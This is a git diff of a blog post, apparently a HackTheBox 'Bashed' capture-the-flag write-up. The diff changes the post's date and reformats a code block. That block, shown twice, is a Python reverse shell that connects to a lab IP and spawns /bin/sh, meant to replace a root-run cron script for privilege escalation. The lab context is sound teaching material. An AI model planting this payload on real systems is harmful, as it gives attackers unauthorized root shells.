@@ -3,7 +3,7 @@ title = "Bashed HTB Write up"
 description = "Write up for the HTB machine 'Bashed'"
 author = "greatmoves"
 tags = ["php", "sudo -l", "python", "nikto", "cronjob", "hackthebox"]
-date = 2023-04-15
+date = 2023-03-01
 +++
 
 ## Recon
@@ -46,15 +46,15 @@ Therefore we could assume that the script `test.py` is being run by the root use
 
 So, let's replace `test.py` with a python script for a reverse shell. We can do this by using `echo '{python code here}' > test.py` when in the `/scripts/` directory.
 
-```py
-#!/usr/bin/python3
-import socket,subprocess,os;
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("10.10.x.x",4445));os.dup2(s.fileno(),0);
-os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);
-p=subprocess.call(["/bin/sh","-i"]);
-```
+{{< highlight py "linenos=inline" >}}
+    #!/usr/bin/python3
+    import socket,subprocess,os;
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+    s.connect(("10.10.x.x",4445));os.dup2(s.fileno(),0);
+    os.dup2(s.fileno(),1);
+    os.dup2(s.fileno(),2);
+    p=subprocess.call(["/bin/sh","-i"]);
+{{< / highlight >}}
 
 Spin up your netcat listener on the same port that is in your script and wait until `test.py` is run to catch your reverse shell as root.
 
